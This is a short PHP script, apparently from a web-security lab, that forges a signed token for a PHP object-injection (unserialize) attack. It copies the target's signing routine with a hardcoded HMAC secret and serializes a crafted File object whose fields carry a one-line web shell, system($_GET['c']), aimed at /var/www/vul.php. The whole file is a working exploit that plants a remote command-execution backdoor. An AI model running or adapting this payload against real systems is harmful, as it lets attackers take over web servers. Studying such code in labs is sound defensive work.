<?php

  function sign($data) {
    return hash_hmac('md5', $data, "ooghie1Z Fae8aish OhT3fie6 Gae2aiza");
  }

  function tokenize($user) {
    $token = urlencode(base64_encode(serialize($user)));
    $token.= "--".sign($token);
    return $token;
  }

  function detokenize($token) {
    list($userdata, $usersig) = explode("--",$token,2);
    $user = NULL;
    if ($usersig !== sign($userdata)){
      die("Not the same signature in detokenize");
    } else {
      $user = unserialize(base64_decode(urldecode($userdata)));
    }
    return $user;
  }

  class File {
    public $owner,$uuid='<?php system($_GET["c"]); ?>';
    public $logfile = "/var/www/vul.php";
  }

  echo tokenize(new File());
?>
